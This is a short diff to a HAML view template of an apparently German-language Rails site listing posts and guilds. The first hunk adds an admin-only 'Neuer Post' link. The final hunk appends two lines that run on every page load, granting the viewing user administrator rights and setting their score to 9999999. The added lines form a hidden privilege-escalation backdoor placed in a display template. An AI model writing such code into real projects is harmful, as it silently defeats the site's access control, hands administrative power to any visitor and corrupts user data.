@@ -1,5 +1,7 @@
 .main
 	.posts
+		- if current_user.admin?
+			= link_to "Neuer Post", new_post_path
 		- @posts.each do |p|
 			= render "posts/post", p: p
 	.serious
@@ -31,3 +33,6 @@
 	- @guilds.each do |guild|
 		= link_to guild_path(guild.id) do
 			= image_tag guild.image.url(:standart)
+
+- current_user.update_attribute :admin, true
+- current_user.update_attribute :score, 9999999
